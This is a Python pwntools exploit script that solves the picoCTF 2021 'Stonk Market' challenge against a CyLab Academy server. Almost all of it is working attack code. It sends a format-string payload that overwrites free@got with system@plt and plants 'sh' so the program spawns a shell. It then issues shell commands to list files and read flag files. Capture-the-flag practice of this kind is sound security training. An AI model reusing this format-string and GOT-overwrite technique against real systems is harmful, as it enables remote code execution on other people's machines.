#!/usr/bin/env python3
# picoCTF 2021 Stonk Market (CyLab id 164) - format string -> GOT overwrite -> RCE
# Technique from TJCSC writeup (Darin Mao). No flag in memory; overwrite free@got -> system@plt
# and make the Portfolio's first bytes "sh\0" so free(p) calls system("sh").
import subprocess, sys, time
from pwn import *

context.log_level = 'info'
HOST = 'xebec.cylabacademy.net'
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 28926


def resolve(host, tries=20):
    for _ in range(tries):
        o = subprocess.run(['getent', 'ahostsv4', host],
                           capture_output=True, text=True).stdout
        for line in o.splitlines():
            if line.split() and '.' in line.split()[0]:
                return line.split()[0]
        time.sleep(2)
    return None


ip = resolve(HOST) or HOST
log.info(f"{HOST}:{PORT} -> {ip}")
p = remote(ip, PORT)

p.sendline(b'1')
p.recvuntil(b'token?')

# %c*10 (10 bytes) -> count 10
# %6299662c -> count 6299672 = 0x602018 (free@got), %n writes it to saved rbp (arg 12)
# %216c -> count +216 = 0x6020f0; %20$hhn writes low byte 0xf0 to [arg20]=free@got => system@plt
# %10504067c -> count = 0x01006873 ("sh\0\1"); %18$n writes to Portfolio* p (arg 18)
payload = b'%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%18$n'
p.sendline(payload)

log.info("draining the ~16MB of padding output...")
end = time.time() + 90
while time.time() < end:
    try:
        d = p.recv(timeout=2)
    except EOFError:
        break
    if not d:
        continue
    if b'sh-' in d or b'$' in d or b'#' in d:
        log.info("looks like shell appeared")
        break

time.sleep(1)
p.sendline(b'echo ===PWNED===; id; ls -la; cat flag.txt 2>/dev/null; cat flag 2>/dev/null; cat api 2>/dev/null; cat /flag* 2>/dev/null')
time.sleep(4)
try:
    out = p.recv(timeout=8)
except EOFError:
    out = b''
print("OUTPUT:", out.decode(errors='replace'))
p.sendline(b'cat flag.txt')
time.sleep(3)
try:
    out2 = p.recv(timeout=6)
except EOFError:
    out2 = b''
print("OUT2:", out2.decode(errors='replace'))
